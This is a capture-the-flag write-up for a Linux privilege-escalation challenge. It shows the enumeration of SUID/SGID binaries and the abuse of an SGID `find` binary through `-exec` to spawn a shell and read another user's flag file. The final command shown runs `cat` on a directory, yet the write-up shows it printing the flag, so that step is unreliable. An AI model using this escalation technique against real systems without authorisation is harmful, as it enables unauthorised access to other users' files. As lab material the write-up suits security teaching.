## Finders Fee
`ssh -p PORT user@challenge.ctf.games`
**Escalate your privileges and uncover the `flag.txt` in the `finder` user's home directory.**
So we want to obtain `/home/finder/flag.txt`.
Once connected we quickly see there is very limited functionality of the environment, which can make it easier or more difficult. Basic steps usually involve investigating programs and processes that the user can use, potentially running with another user privileges. Sudo is not present for `sudo -l` checks, and `ps aux` returns nothing as well.

Another great way to enumerate is searching the file system for binaries executing with SUID and SGID set, indicating *possible* leverage of another user. Coincidentally, the `find` function is how you can achieve this, and is available as user. It also matches the overall theme of *finding* something.
```sh
$ find / -perm -2000 -type f 2>/dev/null
/usr/sbin/pam_extrausers_chkpwd
/usr/sbin/unix_chkpwd
/usr/bin/chage
/usr/bin/expiry
/usr/bin/find
/usr/bin/ssh-agent
$ find / -perm -4000 -type f 2>/dev/null
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/bin/umount
/usr/bin/newgrp
/usr/bin/gpasswd
/usr/bin/mount
/usr/bin/passwd
/usr/bin/chsh
/usr/bin/chfn
/usr/bin/su
```
We can then use `ls -la <binary>` to check the privileges when executed. Going with the the **find** theme, lets check it.
```sh
 $ ls -la /usr/bin/find
-rwxr-sr-x 1 root finder 204264 Apr  8  2024 /usr/bin/find
```
Which tells us `find` is executing with the user `finder` permissions. This is good news, but we need to check if there are exploitation's available utilizing the `find` command. A great resource is [GTFOBins](https://gtfobins.github.io/gtfobins/find/). 
Looking at the examples, it appears as though command execution can be used within the arguments passed to `find`.  For example:
```sh
$ find . -exec /bin/sh \; -quit
```
This will spawn a shell, but because perm is 2000 we don't inherit the groups permissions, so we are still spawning a shell as user. But, we can also pass other commands instead of /bin/sh. Perhaps we can try to read the flag.txt by modifying the command like so:
```sh
$ find . -exec cat /home/finder/ \; -quit
flag{5da1de289823cfc200adf91d6536d914}
```
Success! Read further into SUID and SGID exploitation for more details.
